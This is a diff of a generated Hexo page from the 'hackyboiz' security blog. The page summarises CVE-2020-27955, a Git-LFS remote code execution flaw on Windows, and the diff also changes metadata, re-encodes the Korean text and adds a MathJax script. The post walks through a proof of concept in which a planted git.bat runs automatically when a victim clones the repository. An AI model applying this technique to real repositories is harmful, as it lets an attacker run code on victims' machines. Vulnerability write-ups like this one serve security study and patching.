@@ -61,7 +61,7 @@
   <script src="/js/utils.js"></script>
   <script src="/js/color-schema.js"></script>
 
-<meta name="generator" content="Hexo 5.4.0"><link rel="alternate" href="/rss2.xml" title="hackyboiz" type="application/rss+xml">
+<meta name="generator" content="Hexo 5.1.1"><link rel="alternate" href="/rss2.xml" title="hackyboiz" type="application/rss+xml">
 </head>
 
 <body>
@@ -189,7 +189,7 @@
     
     <span class="post-meta mr-2">
       <i class="iconfont icon-chart"></i>
-      181 자
+      351 자
     </span>
   
 
@@ -199,7 +199,7 @@
       <i class="iconfont icon-clock-fill"></i>
       
       
-      3
+      7
        분
     </span>
   
@@ -242,27 +242,24 @@
               </script>
               <h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a target="_blank" rel="external nofollow noopener noreferrer" href="https://exploitbox.io/vuln/Git-Git-LFS-RCE-Exploit-CVE-2020-27955.html">Git-LFS RCE Exploit CVE-2020-27955</a></p>
 <h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><p>Git &lt;= 2.29.2-git-lfs</p>
-<h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>대용량 파일을 업로드 하기 위해 github에서 개발한 extension인 git-lfs(Large File Storage)에서 Windows를 대상으로 원격 코드 실행이 가능한 취약점이 발견되었습니다.</p>
-<p>해당 취약점을 악용하여 git-lfs로 업로드한 파일이 있는 저장소에서 Windows 시스템의 피해자가 저장소를 복제할 때 상호작용 없이 공격자의 악성 바이너리가 실행될 수 있습니다.</p>
-<p>취약점의 PoC는 아래와 같습니다.</p>
+<h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>&#xB300;&#xC6A9;&#xB7C9; &#xD30C;&#xC77C;&#xC744; &#xC5C5;&#xB85C;&#xB4DC; &#xD558;&#xAE30; &#xC704;&#xD574; github&#xC5D0;&#xC11C; &#xAC1C;&#xBC1C;&#xD55C; extension&#xC778; git-lfs(Large File Storage)&#xC5D0;&#xC11C; Windows&#xB97C; &#xB300;&#xC0C1;&#xC73C;&#xB85C; &#xC6D0;&#xACA9; &#xCF54;&#xB4DC; &#xC2E4;&#xD589;&#xC774; &#xAC00;&#xB2A5;&#xD55C; &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xBC1C;&#xACAC;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;.</p>
+<p>&#xD574;&#xB2F9; &#xCDE8;&#xC57D;&#xC810;&#xC744; &#xC545;&#xC6A9;&#xD558;&#xC5EC; git-lfs&#xB85C; &#xC5C5;&#xB85C;&#xB4DC;&#xD55C; &#xD30C;&#xC77C;&#xC774; &#xC788;&#xB294; &#xC800;&#xC7A5;&#xC18C;&#xC5D0;&#xC11C; Windows &#xC2DC;&#xC2A4;&#xD15C;&#xC758; &#xD53C;&#xD574;&#xC790;&#xAC00; &#xC800;&#xC7A5;&#xC18C;&#xB97C; &#xBCF5;&#xC81C;&#xD560; &#xB54C; &#xC0C1;&#xD638;&#xC791;&#xC6A9; &#xC5C6;&#xC774; &#xACF5;&#xACA9;&#xC790;&#xC758; &#xC545;&#xC131; &#xBC14;&#xC774;&#xB108;&#xB9AC;&#xAC00; &#xC2E4;&#xD589;&#xB420; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p>
+<p>&#xCDE8;&#xC57D;&#xC810;&#xC758; PoC&#xB294; &#xC544;&#xB798;&#xC640; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;.</p>
 <ol>
-<li><p>공격자는 저장소에 실행할 명령어를 포함한 <code>git.*</code> 이름의 windows 바이너리 형식 파일을 추가합니다.</p>
+<li><p>&#xACF5;&#xACA9;&#xC790;&#xB294; &#xC800;&#xC7A5;&#xC18C;&#xC5D0; &#xC2E4;&#xD589;&#xD560; &#xBA85;&#xB839;&#xC5B4;&#xB97C; &#xD3EC;&#xD568;&#xD55C; <code>git.*</code> &#xC774;&#xB984;&#xC758; windows &#xBC14;&#xC774;&#xB108;&#xB9AC; &#xD615;&#xC2DD; &#xD30C;&#xC77C;&#xC744; &#xCD94;&#xAC00;&#xD569;&#xB2C8;&#xB2E4;.</p>
 <pre><code class="hljs bash">git.bat : @<span class="hljs-built_in">echo</span> git-lfs RCE exploit!!
-git add git.bat</code></pre>
-</li>
-<li><p>저장소에 lfs 파일을 추가합니다.</p>
+git add git.bat</code></pre></li>
+<li><p>&#xC800;&#xC7A5;&#xC18C;&#xC5D0; lfs &#xD30C;&#xC77C;&#xC744; &#xCD94;&#xAC00;&#xD569;&#xB2C8;&#xB2E4;.</p>
 <pre><code class="hljs bash">git lfs track <span class="hljs-string">&quot;* .dat&quot;</span> 
 git add .gitattributes
 
 <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;git exploit PoC&quot;</span>&gt; lfs.dat
-git add lfs.dat</code></pre>
-</li>
-<li><p>바이너리와 lfs 파일을 커밋하고 원격 저장소에 업로드합니다.</p>
+git add lfs.dat</code></pre></li>
+<li><p>&#xBC14;&#xC774;&#xB108;&#xB9AC;&#xC640; lfs &#xD30C;&#xC77C;&#xC744; &#xCEE4;&#xBC0B;&#xD558;&#xACE0; &#xC6D0;&#xACA9; &#xC800;&#xC7A5;&#xC18C;&#xC5D0; &#xC5C5;&#xB85C;&#xB4DC;&#xD569;&#xB2C8;&#xB2E4;.</p>
 <pre><code class="hljs bash">git commit -a -m <span class="hljs-string">&quot;git-lfs exploit&quot;</span>
 git remote add origin https://repository_url
-git push -u origin master</code></pre>
-</li>
-<li><p>Windows 시스템에서 clone할 때 git-lfs 취약점이 트리거되어 기존 git 바이너리 대신 공격자의 원격 저장소에서 clone한 악성 <code>git.bat</code>이 사용자 상호작용 없이 실행됩니다.</p>
+git push -u origin master</code></pre></li>
+<li><p>Windows &#xC2DC;&#xC2A4;&#xD15C;&#xC5D0;&#xC11C; clone&#xD560; &#xB54C; git-lfs &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xD2B8;&#xB9AC;&#xAC70;&#xB418;&#xC5B4; &#xAE30;&#xC874; git &#xBC14;&#xC774;&#xB108;&#xB9AC; &#xB300;&#xC2E0; &#xACF5;&#xACA9;&#xC790;&#xC758; &#xC6D0;&#xACA9; &#xC800;&#xC7A5;&#xC18C;&#xC5D0;&#xC11C; clone&#xD55C; &#xC545;&#xC131; <code>git.bat</code>&#xC774; &#xC0AC;&#xC6A9;&#xC790; &#xC0C1;&#xD638;&#xC791;&#xC6A9; &#xC5C6;&#xC774; &#xC2E4;&#xD589;&#xB429;&#xB2C8;&#xB2E4;.</p>
 <pre><code class="hljs bash">PowerShell&gt; git <span class="hljs-built_in">clone</span> https://repository_url
 git-lfs RCE exploit!!</code></pre></li>
 </ol>
@@ -570,6 +567,45 @@ git-lfs RCE exploit!!</code></pre></li>
 
 
 
+
+  
+
+  
+    <!-- MathJax -->
+    <script>
+      MathJax = {
+        tex: {
+          inlineMath: [['$', '$'], ['\\(', '\\)']]
+        },
+        options: {
+          renderActions: {
+            findScript: [10, doc => {
+              document.querySelectorAll('script[type^="math/tex"]').forEach(node => {
+                const display = !!node.type.match(/; *mode=display/);
+                const math = new doc.options.MathItem(node.textContent, doc.inputJax[0], display);
+                const text = document.createTextNode('');
+                node.parentNode.replaceChild(text, node);
+                math.start = { node: text, delim: '', n: 0 };
+                math.end = { node: text, delim: '', n: 0 };
+                doc.math.push(math);
+              });
+            }, '', false],
+            insertedScript: [200, () => {
+              document.querySelectorAll('mjx-container').forEach(node => {
+                let target = node.parentNode;
+                if (target.nodeName.toLowerCase() === 'li') {
+                  target.parentNode.classList.add('has-jax');
+                }
+              });
+            }, '', false]
+          }
+        }
+      };
+    </script>
+
+    <script async src="https://cdn.staticfile.org/mathjax/3.0.5/es5/tex-svg.js"></script>
+
+  
 
 
 
